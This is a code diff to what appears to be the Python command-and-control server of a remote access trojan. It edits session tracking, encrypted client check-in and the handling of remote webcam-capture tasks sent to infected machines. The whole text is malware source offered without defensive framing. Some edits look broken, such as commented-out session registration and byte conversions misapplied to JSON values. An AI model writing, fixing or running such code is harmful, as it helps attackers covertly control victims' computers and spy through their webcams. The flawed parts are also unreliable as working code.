@@ -227,7 +227,7 @@ class C2():
 
         """
         self._active = threading.Event()
-        self._count = 1
+        self._count = 0
         self._prompt = None
         self._database = db
         self.current_session = None
@@ -793,9 +793,9 @@ class C2():
                 result = 'Webcam stream ended'
         else:
             client.send_task({"task": "webcam %s" % args})
-            result = 'Webcam capture complete'
             task = client.recv_task()
             result = task.get('result')
+            client._active.set()
         return result
 
     def session_remove(self, session_id):
@@ -950,10 +950,10 @@ class C2():
     @util.threaded
     def serve_until_stopped(self):
         self.database = database.Database(self._database)
-        for session in self.database.get_sessions(verbose=True):
-            self.database.update_status(session.get('uid'), 0)
-            session['online'] = False
-            self.sessions[session.get('id')] = { "info": session, "connection": None }
+        for session_info in self.database.get_sessions(verbose=True):
+            self.database.update_status(session_info.get('uid'), 0)
+            session_info['online'] = False
+#            self.sessions[session_info.get('id')] = { "info": session_info, "connection": None }
             self._count += 1
         while True:
             connection, address = self.socket.accept()
@@ -1100,11 +1100,11 @@ class Session(threading.Thread):
         self.key = security.diffiehellman(self.connection)
         self.rsa = None  # security.Crypto.PublicKey.RSA.generate(2048)
         try:
-            self.info = self.recv_task()
+            self.info = self.client_info()
             self.info['id'] = self.id
         except Exception as e:
+            print(bytes(e))
             self.info = None
-            return
 
     def kill(self):
         """
@@ -1129,8 +1129,9 @@ class Session(threading.Thread):
         msg = self.connection.recv(msg_size)
         data = security.decrypt_aes(msg, self.key)
         info = json.loads(data)
-        for item in [item for item in info if "_b64" in str(info[item])[0:5]]:
-            info[item] = base64.b64decode(bytes(info[item][6:])).decode('ascii')
+        for key, val in info.items():
+            if bytes(val).startswith("_b64"):
+                info[key] = base64.b64decode(bytes(val[6:])).decode('ascii')
         return info
 
     def status(self):
